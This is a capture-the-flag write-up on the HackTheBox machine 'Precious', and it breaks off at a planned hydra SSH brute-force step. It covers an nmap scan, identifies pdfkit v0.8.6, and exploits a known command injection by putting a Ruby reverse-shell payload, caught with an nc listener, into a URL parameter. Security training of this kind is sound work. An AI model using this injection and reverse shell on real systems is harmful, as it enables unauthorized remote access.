## Precious Writeup

### Machine IP

``` 
10.10.11.189
```

### nmap scan

```
$ nmap -sC -sV -Pn -T4 10.10.11.189

Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-26 08:30 EST
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.37s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
|_http-title: Convert Web Page to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.04 seconds
```

We can see ssh and http are open. We also have something called Phusion Passenger on port 80.


### precious.htb

The http site takes us to a "Convert Web Page to PDF" tool.

Let's spin up a python web server with:

```
python3 -m http.server
```

Using our local IP to connect to the python server and tring to download the root page of the web server...sure enough, the tool gives us a PDF file with the directory listing.

Trying to convert a file with an inline `<script>` tag gives us nothing. Seems as though there is some kind of input sanitization.


### pdf file analysis

Analysing the output pdf file from earlier with `exiftool`:

```
$ exiftool out.pdf
ExifTool Version Number         : 12.52
File Name                       : out.pdf
Directory                       : .
File Size                       : 4.6 kB
File Modification Date/Time     : 2023:01:26 08:49:11-05:00
File Access Date/Time           : 2023:01:26 08:49:21-05:00
File Inode Change Date/Time     : 2023:01:26 10:07:43-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

Interesting... the creator is 'pdfkit v0.8.6'. Let's scour the web for any exploits for this version of pdfkit!


### pdfkit exploit

[This link](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) gives us information about a command injection exploit via ruby, demonstrated by the following example code:

```
PDFKit.new("http://example.com/?name=#{'%20`sleep 5`'}").to_pdf 
# 5 seconds wait... 
```

Let's try this out...sure enough, the page seems to hang for around 5 seconds on submitting the web page!

Time to head to revshells...

 
### Reverse Shell Injection

We read that this exploit was a ruby based exploit. So we spin up a `nc` listener:

```
nc -lnvp 4444
```

and insert a ruby based revshell into our URL like so...

```
http://<LOCALIP>:<LOCALPORT>/?name=%20  {`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("<LOCALIP>",<NCLISTENERPORT>))'`}
```

Clicking submit, we get reverse shell access!


### Directory searching

We find a few files relating to the pdf converter.

Navigating to `/home`, we find there are two users:
1. `ruby` (current user)
2. `henry`

In `henry`'s home directory, we find the `user.txt` flag. cat, head and less don't work on this file do to restrictions. Let's try sshing into the machine as we at least have `henry` username!


### hydra

Let's try and bruteforce the ssh password with hydra.



